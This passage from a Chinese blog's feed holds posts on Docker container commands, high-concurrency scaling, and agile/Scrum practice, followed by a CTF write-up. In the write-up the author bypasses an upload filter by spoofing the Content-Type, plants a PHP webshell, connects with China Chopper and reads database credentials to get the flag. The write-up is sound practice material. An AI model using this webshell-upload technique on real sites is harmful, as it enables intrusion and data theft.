创建的镜像名</p></blockquote><h2 id="3-容器操作"><a href="#3-容器操作" class="headerlink" title="3. 容器操作"></a>3. 容器操作</h2><p>接下来就是正菜了，容器的各种操作，启动，关闭，重启，日志查询以及各种进入容器内部搞事情</p><p><strong>a. run</strong><br>万事开头第一步，加载镜像，创建容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run 镜像名:版本</span><br></pre></td></tr></table></figure><p>run后面可以跟很多的参数，比如容器暴露端口指定，存储映射，权限等等，由于参数过多，下面只给出几个不同的例子，来具体的演示参数可以怎么加</p><p><strong>case1: 创建并后台执行</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -i -t -d centos:latest</span><br></pre></td></tr></table></figure><ul><li>其中关键参数为-d，指定容器运行与前台或者后台，不加上时前台</li><li>-i: 打开STDIN，用于控制台交互</li><li>-t: 支持终端登录</li></ul><p><strong>case2: 运行一个带命令在后台不断执行的容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d centos:latest ping www.baidu.com</span><br></pre></td></tr></table></figure><p><strong>case3: 运行一个在后台不断执行的容器，同时带有命令，程序被终止后还能重启继续跑</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --restart=always centos:latest ping www.baidu.com</span><br></pre></td></tr></table></figure><p><strong>case4: 指定容器名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name=yhh_centos centos:latest</span><br></pre></td></tr></table></figure><p><strong>case5: 暴露容器端口80，并与宿主机端口8080绑定</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name=yhh_centos -p 8080:80 centos:latest</span><br></pre></td></tr></table></figure><p><strong>case6: 指定容器与宿主机目录（/home/yihui/html/www）共享</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name=yhh_centos -v /home/yihui/html/www:/var/www centos:latest</span><br></pre></td></tr></table></figure><p><strong>b. 基操</strong><br>容器创建完毕之后，就是一些基本操作了，启动、停止、重启、删除</p><p><strong>查看容器列表， 列出所有的容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p><strong>启动容器，start后面可以跟上容器名，或者容器id</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker start xxx  </span><br><span class="line"># (这里的xxx可以是容器名：yhh_centos 也可以是容器id：f57398ab22c5)</span><br></pre></td></tr></table></figure><p><strong>关闭容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop xxx</span><br></pre></td></tr></table></figure><p><strong>重启</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart xxx</span><br></pre></td></tr></table></figure><p><strong>删除</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm xxx</span><br></pre></td></tr></table></figure><p>在查看容器列表时，如果某个容器的启动参数特别长，直接使用docker ps -a会发现看不到完整的启动命令，这个时候可以带上参数–no-trunc来显示完整命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a --no-trunc</span><br></pre></td></tr></table></figure><p><strong>c. 进阶</strong><br>接下来进入一些容器的高级操作技巧（实际上也并没有特别酷炫）</p><p>为了演示一些进阶的内容，这里创建一个容器作为测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d --name=yhhos centos</span><br></pre></td></tr></table></figure><p>容器日志查询</p><p>日志，定位问题的神器</p><p><strong>查询xxx容器的日志</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs yhhos</span><br></pre></td></tr></table></figure><p>基本上不太会直接使用上面的命令，因为上面把所有的日志都打印出来了，可以直接晃瞎我们的钛合金x眼</p><p>一般日志可以加两个参数 -f, -t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f -t --since=&quot;2019-05-11&quot; --tail=10 yhhos</span><br></pre></td></tr></table></figure><ul><li>–since : 此参数指定了输出日志开始日期，即只输出指定日期之后的日志。</li><li>-f : 查看实时日志<ul><li>-t : 查看日志产生的日期</li><li>–tail=10 : 查看最后的10条日志。</li></ul></li></ul><p><strong>文件拷贝</strong></p><p>将容器的某个文件捞出来；或者强塞，一个cp即可</p><p><strong>将当前目录的test.md文件拷贝到容器的 /tmp 目录下</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp test.md yhhos:/tmp</span><br></pre></td></tr></table></figure><p><strong>将容器的/tmp/test.md目录拷贝到当前目录下</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp yhhos:/tmp/test.md ./out.md</span><br></pre></td></tr></table></figure><p><strong>进入容器</strong></p><p>进入容器内部，然后就可以为所欲为了…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it yhhos /bin/bash</span><br></pre></td></tr></table></figure><p>获取容器所有信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect yhhos</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一下docker的日常使用命令，本文主要针对linux + mac操作系统而言，window是否适用不太确定，谨慎使用&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="手册" scheme="http://austfish.cn/tags/%E6%89%8B%E5%86%8C/"/>
    
      <category term="docker" scheme="http://austfish.cn/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>什么是高并发</title>
    <link href="http://austfish.cn/2019/12/10/%E4%BB%80%E4%B9%88%E6%98%AF%E9%AB%98%E5%B9%B6%E5%8F%91/"/>
    <id>http://austfish.cn/2019/12/10/什么是高并发/</id>
    <published>2019-12-10T03:33:24.000Z</published>
    <updated>2022-02-18T03:34:21.604Z</updated>
    
    <content type="html"><![CDATA[<p>高并发（High Concurrency）是互联网分布式系统架构设计中必须考虑的因素之一，它通常是指，通过设计保证系统能够同时并行处理很多请求。</p><a id="more"></a><h1 id="一、什么是高并发"><a href="#一、什么是高并发" class="headerlink" title="一、什么是高并发"></a>一、什么是高并发</h1><blockquote><p>高并发（High Concurrency）是互联网分布式系统架构设计中必须考虑的因素之一，它通常是指，通过设计保证系统能够同时并行处理很多请求。</p></blockquote><p><strong>高并发相关常用的一些指标有响应时间（Response Time），吞吐量（Throughput），每秒查询率QPS（Query Per Second），并发用户数等。</strong></p><p><strong>响应时间</strong>：系统对请求做出响应的时间。例如系统处理一个HTTP请求需要200ms，这个200ms就是系统的响应时间。<br><strong>吞吐量</strong>：单位时间内处理的请求数量。<br><strong>QPS</strong>：每秒响应请求数。在互联网领域，这个指标和吞吐量区分的没有这么明显。<br><strong>并发用户数</strong>：同时承载正常使用系统功能的用户数量。例如一个即时通讯系统，同时在线量一定程度上代表了系统的并发用户数。&nbsp;</p><h1 id="二、如何提升系统的并发能力"><a href="#二、如何提升系统的并发能力" class="headerlink" title="二、如何提升系统的并发能力"></a>二、如何提升系统的并发能力</h1><p>互联网分布式架构设计，提高系统并发能力的方式，方法论上主要有两种：<strong>垂直扩展（Scale Up）与水平扩展（Scale Out）。</strong></p><h5 id="垂直扩展：提升单机处理能力。垂直扩展的方式又有两种："><a href="#垂直扩展：提升单机处理能力。垂直扩展的方式又有两种：" class="headerlink" title="垂直扩展：提升单机处理能力。垂直扩展的方式又有两种："></a>垂直扩展：提升单机处理能力。垂直扩展的方式又有两种：</h5><p>（1）增强单机硬件性能，例如：增加CPU核数如32核，升级更好的网卡如万兆，升级更好的硬盘如SSD，扩充硬盘容量如2T，扩充系统内存如128G；</p><p>（2）提升单机架构性能，例如：使用Cache来减少IO次数，使用异步来增加单服务吞吐量，使用无锁数据结构来减少响应时间；</p><p>在互联网业务发展非常迅猛的早期，如果预算不是问题，强烈建议使用“增强单机硬件性能”的方式提升系统并发能力，因为这个阶段，公司的战略往往是发展业务抢时间，而“增强单机硬件性能”往往是最快的方法。</p><p>不管是提升单机硬件性能，还是提升单机架构性能，都有一个致命的不足：单机性能总是有极限的。所以互联网分布式架构设计高并发终极解决方案还是水平扩展。</p><p>水平扩展：只要增加服务器数量，就能线性扩充系统性能。水平扩展对系统架构设计是有要求的，如何在架构各层进行可水平扩展的设计，以及互联网公司架构各层常见的水平扩展实践，是本文重点讨论的内容。</p><h1 id="三、常见的互联网分层架构"><a href="#三、常见的互联网分层架构" class="headerlink" title="三、常见的互联网分层架构"></a>三、常见的互联网分层架构</h1><p><img src="http://qiniu.austfish.cn/blog/20191210/RzJizgxOddPs.png?imageslim" alt="mark"></p><h5 id="常见互联网分布式架构如上，分为："><a href="#常见互联网分布式架构如上，分为：" class="headerlink" title="常见互联网分布式架构如上，分为："></a>常见互联网分布式架构如上，分为：</h5><p>（1）客户端层：典型调用方是浏览器browser或者手机应用APP<br>（2）反向代理层：系统入口，反向代理<br>（3）站点应用层：实现核心应用逻辑，返回html或者json<br>（4）服务层：如果实现了服务化，就有这一层<br>（5）数据-缓存层：缓存加速访问存储<br>（6）数据-数据库层：数据库固化数据存储</p><p>整个系统各层次的水平扩展，又分别是如何实施的呢？</p><h1 id="四、分层水平扩展架构实践"><a href="#四、分层水平扩展架构实践" class="headerlink" title="四、分层水平扩展架构实践"></a>四、分层水平扩展架构实践</h1><p>反向代理层的水平扩展<br><img src="http://qiniu.austfish.cn/blog/20191210/y9IHdqV0Kb6P.png?imageslim" alt="mark"></p><p>反向代理层的水平扩展，是通过“DNS轮询”实现的：dns-server对于一个域名配置了多个解析ip，每次DNS解析请求来访问dns-server，会轮询返回这些ip。<br>当nginx成为瓶颈的时候，只要增加服务器数量，新增nginx服务的部署，增加一个外网ip，就能扩展反向代理层的性能，做到理论上的无限高并发。</p><h5 id="站点层的水平扩展"><a href="#站点层的水平扩展" class="headerlink" title="站点层的水平扩展"></a>站点层的水平扩展</h5><p><img src="http://qiniu.austfish.cn/blog/20191210/VBJiERQcQWfa.png?imageslim" alt="mark"></p><p>站点层的水平扩展，是通过“nginx”实现的。通过修改nginx.conf，可以设置多个web后端。</p><p>当web后端成为瓶颈的时候，只要增加服务器数量，新增web服务的部署，在nginx配置中配置上新的web后端，就能扩展站点层的性能，做到理论上的无限高并发。</p><h5 id="服务层的水平扩展"><a href="#服务层的水平扩展" class="headerlink" title="服务层的水平扩展"></a>服务层的水平扩展</h5><p><img src="http://qiniu.austfish.cn/blog/20191210/8YbizcRz7u96.png?imageslim" alt="mark"></p><p>服务层的水平扩展，是通过“服务连接池”实现的。</p><p>站点层通过RPC-client调用下游的服务层RPC-server时，RPC-client中的连接池会建立与下游服务多个连接，当服务成为瓶颈的时候，只要增加服务器数量，新增服务部署，在RPC-client处建立新的下游服务连接，就能扩展服务层性能，做到理论上的无限高并发。如果需要优雅的进行服务层自动扩容，这里可能需要配置中心里服务自动发现功能的支持。</p><h5 id="数据层的水平扩展"><a href="#数据层的水平扩展" class="headerlink" title="数据层的水平扩展"></a>数据层的水平扩展</h5><p>在数据量很大的情况下，数据层（缓存，数据库）涉及数据的水平扩展，将原本存储在一台服务器上的数据（缓存，数据库）水平拆分到不同服务器上去，以达到扩充系统性能的目的。</p><p>互联网数据层常见的水平拆分方式有这么几种，以数据库为例：</p><h5 id="按照范围水平拆分"><a href="#按照范围水平拆分" class="headerlink" title="按照范围水平拆分"></a>按照范围水平拆分</h5><p><img src="http://qiniu.austfish.cn/blog/20191210/jhhRCezHybYw.png?imageslim" alt="mark"></p><h5 id="每一个数据服务，存储一定范围的数据，上图为例："><a href="#每一个数据服务，存储一定范围的数据，上图为例：" class="headerlink" title="每一个数据服务，存储一定范围的数据，上图为例："></a>每一个数据服务，存储一定范围的数据，上图为例：</h5><p>user0库，存储uid范围1-1kw<br>user1库，存储uid范围1kw-2kw</p><h5 id="这个方案的好处是："><a href="#这个方案的好处是：" class="headerlink" title="这个方案的好处是："></a>这个方案的好处是：</h5><p>（1）规则简单，service只需判断一下uid范围就能路由到对应的存储服务；<br>（2）数据均衡性较好；<br>（3）比较容易扩展，可以随时加一个uid[2kw,3kw]的数据服务；</p><h5 id="不足是："><a href="#不足是：" class="headerlink" title="不足是："></a>不足是：</h5><p>（1）请求的负载不一定均衡，一般来说，新注册的用户会比老用户更活跃，大range的服务请求压力会更大；</p><h5 id="按照哈希水平拆分"><a href="#按照哈希水平拆分" class="headerlink" title="按照哈希水平拆分"></a>按照哈希水平拆分</h5><p><img src="http://qiniu.austfish.cn/blog/20191210/4KbAecSSEVzl.png?imageslim" alt="mark"><br>每一个数据库，存储某个key值hash后的部分数据，上图为例：<br>user0库，存储偶数uid数据<br>user1库，存储奇数uid数据</p><h5 id="这个方案的好处是：-1"><a href="#这个方案的好处是：-1" class="headerlink" title="这个方案的好处是："></a>这个方案的好处是：</h5><p>（1）规则简单，service只需对uid进行hash能路由到对应的存储服务；<br>（2）数据均衡性较好；<br>（3）请求均匀性较好；</p><h5 id="不足是：-1"><a href="#不足是：-1" class="headerlink" title="不足是："></a>不足是：</h5><p>（1）不容易扩展，扩展一个数据服务，hash方法改变时候，可能需要进行数据迁移；</p><blockquote><p>这里需要注意的是，通过水平拆分来扩充系统性能，与主从同步读写分离来扩充数据库性能的方式有本质的不同。</p></blockquote><h5 id="通过水平拆分扩展数据库性能："><a href="#通过水平拆分扩展数据库性能：" class="headerlink" title="通过水平拆分扩展数据库性能："></a>通过水平拆分扩展数据库性能：</h5><p>（1）每个服务器上存储的数据量是总量的1/n，所以单机的性能也会有提升；<br>（2）n个服务器上的数据没有交集，那个服务器上数据的并集是数据的全集；<br>（3）数据水平拆分到了n个服务器上，理论上读性能扩充了n倍，写性能也扩充了n倍（其实远不止n倍，因为单机的数据量变为了原来的1/n）；</p><h5 id="通过主从同步读写分离扩展数据库性能："><a href="#通过主从同步读写分离扩展数据库性能：" class="headerlink" title="通过主从同步读写分离扩展数据库性能："></a>通过主从同步读写分离扩展数据库性能：</h5><p>（1）每个服务器上存储的数据量是和总量相同；（2）n个服务器上的数据都一样，都是全集；<br>（3）理论上读性能扩充了n倍，写仍然是单点，写性能不变；</p><p>缓存层的水平拆分和数据库层的水平拆分类似，也是以范围拆分和哈希拆分的方式居多，就不再展开。</p><h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>高并发（High Concurrency）是互联网分布式系统架构设计中必须考虑的因素之一，它通常是指，通过设计保证系统能够同时并行处理很多请求。</p><p>提高系统并发能力的方式，方法论上主要有两种：垂直扩展（Scale Up）与水平扩展（Scale Out）。前者垂直扩展可以通过提升单机硬件性能，或者提升单机架构性能，来提高并发性，但单机性能总是有极限的，互联网分布式架构设计高并发终极解决方案还是后者：水平扩展。</p><h5 id="互联网分层架构中，各层次水平扩展的实践又有所不同："><a href="#互联网分层架构中，各层次水平扩展的实践又有所不同：" class="headerlink" title="互联网分层架构中，各层次水平扩展的实践又有所不同："></a>互联网分层架构中，各层次水平扩展的实践又有所不同：</h5><p>（1）反向代理层可以通过“DNS轮询”的方式来进行水平扩展；<br>（2）站点层可以通过nginx来进行水平扩展；<br>（3）服务层可以通过服务连接池来进行水平扩展；（4）数据库可以按照数据范围，或者数据哈希的方式来进行水平扩展；</p><p>各层实施水平扩展后，能够通过增加服务器数量的方式来提升系统的性能，做到理论上的性能无限。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;高并发（High Concurrency）是互联网分布式系统架构设计中必须考虑的因素之一，它通常是指，通过设计保证系统能够同时并行处理很多请求。&lt;/p&gt;
    
    </summary>
    
    
      <category term="开发" scheme="http://austfish.cn/tags/%E5%BC%80%E5%8F%91/"/>
    
      <category term="知识" scheme="http://austfish.cn/tags/%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>浅谈敏捷开发流程</title>
    <link href="http://austfish.cn/2019/12/10/%E6%B5%85%E8%B0%88%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/"/>
    <id>http://austfish.cn/2019/12/10/浅谈敏捷开发流程/</id>
    <published>2019-12-10T01:29:49.000Z</published>
    <updated>2022-02-18T03:34:22.300Z</updated>
    
    <content type="html"><![CDATA[<p>什么是敏捷开发<br>敏捷开发以用户的需求进化为核心，采用迭代、循序渐进的方法进行软件开发。</p><a id="more"></a><p>在开始讲敏捷开发流程之前，我们得先了解几个名词概念。</p><ul><li>Product backlog：产品需求池，即罗列产品需求的文档。</li><li>Sprint：原意为冲刺，指一个迭代。</li><li>Sprint Backlog：Sprint待办列表，指Sprint任务清单。</li><li>Product Backlog Item：产品待办清单条目，简称PBI。</li><li>Story board：故事看板，通常可以用于展现每天每个人需要做什么事情。</li><li>燃尽图：团队用于做Sprint内的进展跟踪图。</li><li>产品文档：记录所有的需求、变更记录。</li><li>站会：每日站会是开发团队的一个以 15 分钟为限的事件。</li></ul><p>通常一个Scrum 团队由一名产品负责人、开发团队和一名 Scrum Master（简称SM，敏捷教练，通常是指导管理工作和辅助需求方案分析） 组成，团队不需要大，但要齐备。</p><p>团队组建完毕，就可以开始干活了。</p><p>通常需求会来自于外部（市场需求、用户反馈）或内部（战略规划），以敏捷的方法来收集需求，建议是采用User Story用户故事的方法。</p><p>当收集好需求，接下来就可以梳理出Product Backlog了，通常收集需求到Product Backlog这一步是贯穿整个项目的生命周期的，尤其是对于面向甲方的外包项目。</p><p>根据需求池，产品负责人和SM首先需要确定每一个Sprint的周期是多长，一般都是按照一周的时间安排，然后需要规划出接下来的一个sprint要开发的需求，并和开发团队一起根据这个Sprint Backlog对需求进行分解，形成PBI，也就是具体的开发任务。</p><p>当整个团队对PBI没有疑问或意见后，即可绘制燃尽图，将PBI按照日程分配到看板上，安排进行开发。</p><p>在一个Sprint的进程中，每一天都应该举行一次站会，站会的目的是跟进一个Sprint的进度，然后解答团队成员的疑惑，及时解决问题，避免对进度产生影响。如果是无法在当前Sprint完成的任务，应该进行评审，推入到下一个Sprint中。当一个sprint完成之后，项目组应该对此进行评审，过审则上线，不过审也应该推入下一个sprint中。</p><p>最后还可以开一个sprint的回顾会议，审视上一个sprint中存在的问题，吸取教训，总结经验，然后推动下一个sprint的执行。</p><p>最终以此循环完成一个项目的开发。</p><p><img src="http://qiniu.austfish.cn/blog/20191210/L53IXUy1KpeU.png?imageslim" alt="mark"></p><h2 id="谈谈敏捷中的用户故事"><a href="#谈谈敏捷中的用户故事" class="headerlink" title="谈谈敏捷中的用户故事"></a>谈谈敏捷中的用户故事</h2><h3 id="用户故事的基本理解"><a href="#用户故事的基本理解" class="headerlink" title="用户故事的基本理解"></a>用户故事的基本理解</h3><p>用户故事：从用户角度描述用户渴望得到的功能。</p><p>一般句式：作为一名&lt;角色&gt;，我可以&lt;活动<br>&gt;，使得&lt;业务价值&gt;。</p><p>&lt;角色&gt;说明由谁执行动作，或者谁从相关活动收到价值，甚至可以代表发起相关活动的另一个系统；</p><p>&lt;活动&gt;说明在系统中执行的动作；</p><p>&lt;业务价值&gt;说明相关活动实现的价值。</p><h3 id="用户故事的特点"><a href="#用户故事的特点" class="headerlink" title="用户故事的特点"></a>用户故事的特点</h3><p>良好用户故事的INVEST</p><ul><li><p>Independent（独立性）可以被单独地开发、测试甚至交付。有些故事之间会有自然的顺序依赖，但每个部分仍具备单独交付价值。<br>有些无价值的依赖，我们需要寻找和消除依赖（通常是和其他依赖的故事结合起来取交集，形成一个新的用户故事）。</p></li><li><p>Negotiable（可协商）允许、且需要经过协商。</p></li><li>Valuable（有价值）用户故事必须向用户、客户或产品干系人提供一定的价值。</li><li>Estimable（可估算）可估算的用户故事能够提取任何隐藏的假定和欠缺的验收标准，并且澄清团队对用户故事的共同理解。</li><li>Small（小型）用户故事应该小到能够在一次迭代中完成。</li><li>Testable（可测试）可测试的用户故事能够避免造成结构不良、过于复杂或是依赖于其他故事等问题，导致迭代失败。</li></ul><p>为了保证无法离开迭代（通过测试）的故事不进入迭代，可以采用“先写测试”的方式。</p><h3 id="分割用户故事"><a href="#分割用户故事" class="headerlink" title="分割用户故事"></a>分割用户故事</h3><p><img src="http://qiniu.austfish.cn/blog/20191210/Qe0IApxr8NzF.png?imageslim" alt="mark"></p><p><img src="http://qiniu.austfish.cn/blog/20191210/S9RDV7t0zS4d.png?imageslim" alt="mark"></p><h3 id="故事穿刺"><a href="#故事穿刺" class="headerlink" title="故事穿刺"></a>故事穿刺</h3><p><strong>故事穿刺</strong>是一种特殊类型的故事，用于消除在用户故事或其他项目方面的风险和不确定性。<br>故事穿刺的基本作用包含：</p><ul><li>故事穿刺可以用于基本研究，从而使团队熟悉新技术或新领域；</li><li>如果故事过大难以适当地估算，团队可以利用故事穿刺来分析其隐含行为，从而把故事分割到一些可估算的部分；</li><li>故事可能包含重大的技术风险，团队必须做一些研究或原型化来获取对技术方案的信心，使他们能够在未来时间盒中做出对用户故事的承诺；</li><li>故事可能包含重大的功能风险，其中的故事意图可能已经理解，但是系统如何与用户交互以实现蕴含收益却并不明确。</li></ul><p><strong>技术穿刺：</strong><br>技术穿刺被用于研究在解答域的各种技术方式。例如，技术穿刺可以用于做出构建或是购买的决定，计算新用户故事的潜在性能或负载影响，评估对解决方案采取的特定技术或者在时间盒中做出新功能承诺之前，出于某种原因，团队需要加强对理想方式更具信心的理解而使用它。</p><p><strong>功能穿刺：</strong><br>功能穿刺一般用于对用户与系统的交互方式有较大不确定性时。功能穿刺经常是通过一定程度的原型化进行评估，对此可以采取用户交互实体模型、线框、页面流或者是适于从客户或干系人取得反馈的任何其他技术。</p><p><strong>指导原则：</strong></p><ul><li>可估算、可演示而且可验收</li><li>例外，而非规则</li></ul><h3 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h3><p>用户故事不是需求说明书；故事不是详尽的需求说明书（系统应该完成的事），而是可协商的意向表达（系统需要完成诸如此类之事）。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;什么是敏捷开发&lt;br&gt;敏捷开发以用户的需求进化为核心，采用迭代、循序渐进的方法进行软件开发。&lt;/p&gt;
    
    </summary>
    
    
      <category term="开发" scheme="http://austfish.cn/tags/%E5%BC%80%E5%8F%91/"/>
    
      <category term="知识" scheme="http://austfish.cn/tags/%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Web-Do you know upload？</title>
    <link href="http://austfish.cn/2019/11/14/CTF-Web-Do-you-know-upload%EF%BC%9F/"/>
    <id>http://austfish.cn/2019/11/14/CTF-Web-Do-you-know-upload？/</id>
    <published>2019-11-14T08:08:28.000Z</published>
    <updated>2022-02-18T03:34:20.266Z</updated>
    
    <content type="html"><![CDATA[<p>背景：迫于挖洞挖不dao，练练CTF，复习复习。<br><a id="more"></a></p><h2 id="0×00-背景迫于挖洞挖不dao，练练CTF，复习复习。"><a href="#0×00-背景迫于挖洞挖不dao，练练CTF，复习复习。" class="headerlink" title="0×00 背景迫于挖洞挖不dao，练练CTF，复习复习。"></a>0×00 背景迫于挖洞挖不dao，练练CTF，复习复习。</h2><p>题目地址<br><a href="https://www.ichunqiu.com/battalion?t=1&amp;r=61025" target="_blank" rel="noopener">https://www.ichunqiu.com/battalion?t=1&amp;r=61025</a></p><h2 id="0×01-审题"><a href="#0×01-审题" class="headerlink" title="0×01 审题"></a>0×01 审题</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAxOTExMTQvekNIM3JXV1FiQWN1LnBuZw?x-oss-process=image/format,png" alt="mark"><br>文件上传<br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAxOTExMTQvNHhrTzVtREswZXEzLnBuZw?x-oss-process=image/format,png" alt="mark"></p><h2 id="0×02-文件上传"><a href="#0×02-文件上传" class="headerlink" title="0×02 文件上传"></a>0×02 文件上传</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAxOTExMTQvclNDSmtKb1Q3R3dILnBuZw?x-oss-process=image/format,png" alt="mark"><br>上传一个图片，成功。然后传php文件，提示文件类型错误，bp抓包，将上传类型改成image/jpeg，上传成功</p><h2 id="0×03-菜刀连接"><a href="#0×03-菜刀连接" class="headerlink" title="0×03 菜刀连接"></a>0×03 菜刀连接</h2><p><img src="http://qiniu.austfish.cn/blog/20191114/YIcvS0TnJ3j0.png?imageslim" alt="mark"><br>于是上传一句话看看，菜刀连接成功。在html目录下没有文件，但是是空的。于是想到flag可能在数据库中</p><h2 id="0×04-连接数据库"><a href="#0×04-连接数据库" class="headerlink" title="0×04 连接数据库"></a>0×04 连接数据库</h2><p>一般情况下配置文件(config.php)中可能保存连接数据库的用户名和密码 ，比如这里的改文件就是:<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"ctf"</span>;</span><br><span class="line">$password = <span class="string">"ctfctfctf"</span>;</span><br><span class="line">$database = <span class="string">"ctf"</span>;</span><br><span class="line">$conn = mysql_connect($servername,$username,$password) or die(<span class="string">" connect to mysql error"</span>);</span><br><span class="line">mysql_select_db($database);?&gt;</span><br></pre></td></tr></table></figure></p><p>那么用中国菜刀连接网站数据库的格式就是<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;T&gt;数据库类型&lt;/T&gt;</span><br><span class="line">&lt;H&gt;服务名称&lt;/H&gt;</span><br><span class="line">&lt;U&gt;用户名&lt;/U&gt;</span><br><span class="line">&lt;P&gt;密码&lt;/P&gt;</span><br></pre></td></tr></table></figure></p><p>换做这道题就是:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;T&gt;MYSQL&lt;/T&gt;</span><br><span class="line">&lt;H&gt;localhost&lt;/H&gt;</span><br><span class="line">&lt;U&gt;ctf&lt;/U&gt;</span><br><span class="line">&lt;P&gt;ctfctfctf&lt;/P&gt;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAxOTExMTQvRDdyZUF3dG0wR2JqLnBuZw?x-oss-process=image/format,png" alt="mark"><br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAxOTExMTQvYlljdmtBdm1JZ3JXLnBuZw?x-oss-process=image/format,png" alt="mark"></p><h2 id="0×05-拿到Flag"><a href="#0×05-拿到Flag" class="headerlink" title="0×05 拿到Flag"></a>0×05 拿到Flag</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3Fpbml1LmF1c3RmaXNoLmNuL2Jsb2cvMjAxOTExMTQvVkxQZEFvNWV4MUp1LnBuZw?x-oss-process=image/format,png" alt="mark"></p><h2 id="0×06-总结"><a href="#0×06-总结" class="headerlink" title="0×06 总结"></a>0×06 总结</h2><p>居然不知道菜刀可以连接数据库，还是练少了，玩少了。<br>立下flag,年前好好复习，刷课刷题刷SRC!</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;背景：迫于挖洞挖不dao，练练CTF，复习复习。&lt;br&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://austfish.cn/tags/ctf/"/>
    
      <category term="wp" scheme="http://austfish.cn/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>渗透初期准备工作-信息收集方法总结</title>
    <link href="http://austfish.cn/2019/10/10/%E6%B8%97%E9%80%8F%E5%88%9D%E6%9C%9F%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://austfish.cn/2019/10/10/渗透初期准备工作-信息收集方法总结/</id>
    <published>2019-10-10T09:04:09.000Z</published>
    <updated>2022-02-18T03:34:22.320Z</updated>
    
